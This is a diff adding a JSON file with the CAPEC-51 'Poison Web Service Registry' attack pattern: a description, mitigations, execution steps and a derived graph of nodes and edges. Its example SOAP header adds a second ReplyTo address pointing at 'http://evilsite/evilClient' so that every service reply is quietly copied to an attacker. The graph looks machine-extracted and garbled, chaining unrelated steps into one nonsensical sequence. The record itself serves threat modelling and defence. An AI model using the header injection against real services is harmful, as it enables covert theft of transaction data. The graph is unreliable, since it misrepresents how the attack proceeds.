@@ -1,0 +1,269 @@
+{
+  "graph": {
+    "capec_id": "51",
+    "name": "Poison Web Service Registry",
+    "abstraction": "Detailed",
+    "status": "Draft",
+    "description": "SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata, and delete information about service provider interfaces.",
+    "likelihood": "High",
+    "severity": "Very High",
+    "related_attack_patterns": [
+      {
+        "capec_id": "203",
+        "nature": "ChildOf"
+      }
+    ],
+    "prerequisites": [
+      "The attacker must be able to write to resources or redirect access to the service registry."
+    ],
+    "skills_required": [
+      {
+        "level": "Low",
+        "description": "To identify and execute against an over-privileged system interface"
+      }
+    ],
+    "resources_required": [
+      "Capability to directly or indirectly modify registry resources"
+    ],
+    "consequences": [
+      {
+        "scope": [
+          "Confidentiality",
+          "Integrity",
+          "Availability"
+        ],
+        "impact": "Execute Unauthorized Commands"
+      },
+      {
+        "scope": [
+          "Confidentiality"
+        ],
+        "impact": "Read Data"
+      },
+      {
+        "scope": [
+          "Integrity"
+        ],
+        "impact": "Modify Data"
+      }
+    ],
+    "mitigations": [
+      "Design: Enforce principle of least privilege",
+      "Design: Harden registry server and file access permissions",
+      "Implementation: Implement communications to and from the registry using secure protocols"
+    ],
+    "example_instances": [
+      "WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime. <S:Header> <wsa:MessageID> http://example.com/Message  </wsa:MessageID>  <wsa:ReplyTo> <wsa:Address>http://valid.example/validClient</wsa:Address>  </wsa:ReplyTo>  <wsa:ReplyTo> <wsa:Address>http://evilsite/evilClient</wsa:Address>  </wsa:ReplyTo>  <wsa:FaultTo> <wsa:Address>http://validfaults.example/ErrorHandler</wsa:Address>  </wsa:FaultTo>  </S:Header> In this example \"evilsite\" is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault."
+    ],
+    "related_weaknesses": [
+      "285",
+      "74",
+      "693"
+    ],
+    "matched_cwes": [
+      "285",
+      "693",
+      "74"
+    ],
+    "taxonomy_mappings": [],
+    "execution_flow": [
+      {
+        "step": "1",
+        "phase": "Explore",
+        "description": "[Find a target SOA or Web Service] The adversary must first indentify a target SOA or Web Service.",
+        "techniques": []
+      },
+      {
+        "step": "2",
+        "phase": "Experiment",
+        "description": "[Determine desired outcome] Because poisoning a web service registry can have different outcomes, the adversary must decide how they wish to effect the webservice.",
+        "techniques": [
+          "An adversary can perform a denial of service attack on a web service.",
+          "An adversary can redirect requests or responses to a malicious service."
+        ]
+      },
+      {
+        "step": "3",
+        "phase": "Experiment",
+        "description": "[Determine if a malicious service needs to be created] If the adversary wishes to redirect requests or responses, they will need to create a malicious service to redirect to.",
+        "techniques": [
+          "Create a service to that requests are sent to in addition to the legitimate service and simply record the requests.",
+          "Create a service that will give malicious responses to a service provider.",
+          "Act as a malicious service provider and respond to requests in an arbitrary way."
+        ]
+      },
+      {
+        "step": "4",
+        "phase": "Exploit",
+        "description": "[Poison Web Service Registry] Based on the desired outcome, poison the web service registry. This is done by altering the data at rest in the registry or uploading malicious content by spoofing a service provider.",
+        "techniques": [
+          "Intercept and change WS-Adressing headers to route to a malicious service or service provider.",
+          "Provide incorrect information in schema or metadata to cause a denial of service.",
+          "Delete information about service procider interfaces to cause a denial of service."
+        ]
+      }
+    ],
+    "directed": true
+  },
+  "nodes": [
+    {
+      "id": "find_target_web_service",
+      "attributes": {}
+    },
+    {
+      "id": "indentify_a_target_soa_or_web_service",
+      "attributes": {}
+    },
+    {
+      "id": "desire_outcome",
+      "attributes": {}
+    },
+    {
+      "id": "induce_denial_of_service",
+      "attributes": {}
+    },
+    {
+      "id": "redirect_requests_or_responses_to_a_malicious_service",
+      "attributes": {}
+    },
+    {
+      "id": "wish_to_redirect_requests_or_responses",
+      "attributes": {}
+    },
+    {
+      "id": "create_a_service_to_that_requests",
+      "attributes": {}
+    },
+    {
+      "id": "create_a_service_that_will_give_malicious_responses_to_a_service_provider",
+      "attributes": {}
+    },
+    {
+      "id": "remove_data",
+      "attributes": {}
+    },
+    {
+      "id": "provide_incorrect_information_in_schema_or_metadata",
+      "attributes": {}
+    },
+    {
+      "id": "interface_service_procider",
+      "attributes": {}
+    },
+    {
+      "id": "provide_location_and_metadata",
+      "attributes": {}
+    },
+    {
+      "id": "detect_attack",
+      "attributes": {}
+    },
+    {
+      "id": "send_a_copy",
+      "attributes": {}
+    },
+    {
+      "id": "generate_a_reply_message_of_the_transaction_status",
+      "attributes": {}
+    },
+    {
+      "id": "have_access_to",
+      "attributes": {}
+    },
+    {
+      "id": "register_this",
+      "attributes": {}
+    },
+    {
+      "id": "write_to_resources",
+      "attributes": {}
+    }
+  ],
+  "edges": [
+    {
+      "source": "find_target_web_service",
+      "target": "indentify_a_target_soa_or_web_service",
+      "attributes": {}
+    },
+    {
+      "source": "indentify_a_target_soa_or_web_service",
+      "target": "desire_outcome",
+      "attributes": {}
+    },
+    {
+      "source": "desire_outcome",
+      "target": "induce_denial_of_service",
+      "attributes": {}
+    },
+    {
+      "source": "induce_denial_of_service",
+      "target": "redirect_requests_or_responses_to_a_malicious_service",
+      "attributes": {}
+    },
+    {
+      "source": "redirect_requests_or_responses_to_a_malicious_service",
+      "target": "wish_to_redirect_requests_or_responses",
+      "attributes": {}
+    },
+    {
+      "source": "wish_to_redirect_requests_or_responses",
+      "target": "create_a_service_to_that_requests",
+      "attributes": {}
+    },
+    {
+      "source": "create_a_service_to_that_requests",
+      "target": "create_a_service_that_will_give_malicious_responses_to_a_service_provider",
+      "attributes": {}
+    },
+    {
+      "source": "create_a_service_that_will_give_malicious_responses_to_a_service_provider",
+      "target": "remove_data",
+      "attributes": {}
+    },
+    {
+      "source": "remove_data",
+      "target": "provide_incorrect_information_in_schema_or_metadata",
+      "attributes": {}
+    },
+    {
+      "source": "provide_incorrect_information_in_schema_or_metadata",
+      "target": "interface_service_procider",
+      "attributes": {}
+    },
+    {
+      "source": "interface_service_procider",
+      "target": "provide_location_and_metadata",
+      "attributes": {}
+    },
+    {
+      "source": "provide_location_and_metadata",
+      "target": "detect_attack",
+      "attributes": {}
+    },
+    {
+      "source": "detect_attack",
+      "target": "send_a_copy",
+      "attributes": {}
+    },
+    {
+      "source": "send_a_copy",
+      "target": "generate_a_reply_message_of_the_transaction_status",
+      "attributes": {}
+    },
+    {
+      "source": "generate_a_reply_message_of_the_transaction_status",
+      "target": "have_access_to",
+      "attributes": {}
+    },
+    {
+      "source": "have_access_to",
+      "target": "register_this",
+      "attributes": {}
+    },
+    {
+      "source": "register_this",
+      "target": "write_to_resources",
+      "attributes": {}
+    }
+  ]
+}
